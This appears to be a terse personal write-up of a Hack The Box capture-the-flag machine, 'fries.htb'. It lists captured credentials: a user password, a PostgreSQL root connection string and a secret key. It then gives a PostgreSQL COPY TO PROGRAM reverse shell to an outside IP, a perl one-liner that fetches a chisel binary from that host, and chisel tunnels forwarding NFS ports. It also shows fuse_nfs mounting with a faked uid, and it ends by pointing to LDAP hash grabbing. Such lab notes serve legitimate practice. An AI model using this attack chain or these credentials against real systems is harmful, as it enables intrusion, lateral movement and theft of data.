
```note_
d.cooper@fries.htb  ::  D4LE11maan!!

DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```



--> Get a full Linux reverse shell (inside Docker)

Start your listener:

nc -lvnp 4444


Then run in PostgreSQL:

```
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.15.145/1337 0>&1"';
```



Once you’re in:

Download files via perl ;
```
perl -MHTTP::Tiny -e '$res = HTTP::Tiny->new->get("http://10.10.15.145/chisel_"); die "Failed\n" unless $res->{success}; open(F,">/tmp/chisel") or die $!; binmode F; print F $res->{content}; close F'
```


nfs share --> port forwd ;

Run Chisel ;

```
./chisel client 10.10.15.145:8080 R:111:172.18.0.1:111 R:2049:172.18.0.1:2049 &
```


```
./chisel_ server --reverse    
     
2025/11/28 17:16:39 server: Reverse tunnelling enabled
```


nsf_analysis --> find juicy nfs shares and info.

```
nfs_analyze 127.0.0.1 /srv/web.fries.htb
```                               

You get Root File Handle ;

```
fuse_nfs /tmp/mount3/ 127.0.0.1 --fake-uid --allow-write --manual-fh 0100070201000a00000000008a01da16c18a400cbc9b37e3567d3fba02000000000000000200000000000000
```








--> ldap hash grab --> the its DC Chal..